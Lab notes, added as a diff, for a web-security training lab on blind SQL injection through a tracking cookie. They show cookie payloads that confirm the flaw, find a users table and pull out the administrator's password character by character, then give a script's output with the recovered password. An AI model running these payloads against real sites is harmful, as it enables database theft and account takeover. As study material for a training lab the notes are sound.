@@ -1,0 +1,128 @@
+Lab 11 - Blind SQL injection with conditional responses
+
+Veulnerable parameter - tracking cookie
+
+End Goals:
+
+1. Enumerate the password of the administrator
+2. Login as the administrator user
+
+Analysis:
+
+1. Confirm that the parameter is vulnerable to blind SQLi
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'hFevAvvNCY9p80cv' // infer the format of the backend query; this is not the real query
+
+- If this tracking id exists -> query returns value -> Welcome back message
+- If this tracking id does not exist -> query returns nothing -> no Welcome back message
+
+
+- In the request tab in Burp Repeater
+Cookie: TrackingId=hFevAvvNCY9p80cv' AND 1=1--; 
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'hFevAvvNCY9p80cv' AND 1=1--
+-> TRUE -> Welcome back
+
+- In the request tab in Burp Repeater
+Cookie: TrackingId=hFevAvvNCY9p80cv' AND 1=0--; 
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'hFevAvvNCY9p80cv' AND 1=0--
+-> FALSE -> No Welcome Back
+
+--> Vulnerable to blind SQLi confirmed
+
+2. Confirm that we have a users table
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'hFevAvvNCY9p80cv' AND (SELECT 'x' FROM users LIMIT 1)='x'--
+
+NOTE: 'x' is an arbitrary value. Idea is this query says "if there is a users table, output value 'x' for each entry in users table."
+So, if the users table has 5 users, we should have 5 rows with 'x' in them.
+This might destroy our query, so we limited it to 1 entry using LIMIT 1.
+
+Output value 'x' for each entry in users table, and limit it to only 1 entry. If that entry is equal to x, evaluate to true, else evaluate to false.
+Obviously, if "users" table does not exist, the query will evaluate to false and no Welcome back message will be displayed.
+However, if "users" table exists, it will output 'x' for the first entry in the users table. Then, 'x' will equal 'x' which will evaluate to true
+and display Welcome back.
+
+This is how we ask the question "does the users table exist in the database or not"
+
+Cookie: TrackingId=hFevAvvNCY9p80cv'+AND+(SELECT+'x'+FROM+users+LIMIT+1)%3d'x'--;
+-> 200 response -> Welcome back message
+
+--> Users table exists
+
+3. Confirm that the username "administrator" exists in the users table
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'hFevAvvNCY9p80cv' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
+
+Cookie: TrackingId=hFevAvvNCY9p80cv'+AND+(SELECT+username+FROM+users+WHERE+username%3d'administrator')%3d'administrator'--;
+-> 200 response -> Welcome back message
+
+--> Administrator user exists
+
+4. Enumerate the password of the administrator user
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'hFevAvvNCY9p80cv' AND 
+    (SELECT password FROM users WHERE username='administrator')='Welcome2021!'--
+NOTE: The query above guesses that the password is "Welcome2021!" via brute-force. This is useless because you can brute-force the password in the
+browser. We don't need Burp Suite and all of these techniques for that...
+
+Instead, we will ask a series of relevant TRUE/FALSE questions. For instance, 
+- "is the first character of the password 'a'?"
+- "is the first character of the password 'b'?"
+- "is the first character of the password 'c'?"
+...
+Assume we got "f" as true. We will now enumerate the second character of the password as follows:
+- "are the first two characters of the password 'fa'?"
+- "are the first two characters of the password 'fb'?"
+- "are the first two characters of the password 'fc'?"
+... so on and so forth.
+
+This password enumeration techniques requires Burp Intruder, which is a only available in Burp Suite Pro version.
+
+4.1 Start by determining the LENGTH of the password
+
+Similarly, we can ask the following questions:
+- "is the length of the password 1?"
+- "is the length of the password 2?"
+- "is the length of the password 3?"
+...
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'hFevAvvNCY9p80cv' AND 
+    (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
+
+- ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
+- ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>2)='administrator'--
+- ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>3)='administrator'--
+...
+
+This password enumeration techniques requires Burp Intruder, which is a only available in Burp Suite Pro version.
+Doing this in Burp Community Edition with Repeater would take forever...
+
+--> Password is 20 characters
+
+4.2 Now we can enumerate the password knowing the number of characters the password has
+
+SELECT tracking-id FROM tracking-table WHERE trackingId = 'hFevAvvNCY9p80cv' AND
+    (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a'--
+
+- ' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a'--
+- ' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='b'--
+- ' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='c'--
+...
+
+NOTE: start w/ first character and only 1 character. If first char is 'a', display Welcome back msg. Else, display nothing.
+
+Since we don't have Burp Intruder, let's just move on to the Python part of the lab.
+
+========================================================================================================================================
+Python script usage and output:
+
+- The sqli-lab-11.py script brute forces the password with SQL injections without triggering the "you have reached X maximum tries"
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-11]
+└─$ python3 sqli-lab-11.py "https://0a4f00bc0468443682f0cede00ba0037.web-security-academy.net"
+[+] Retrieving administrator password...
+ylj7y9lgkrol1vbqhfju
+
+Copy/paste the password above into the browser's login form and voila, you're in.
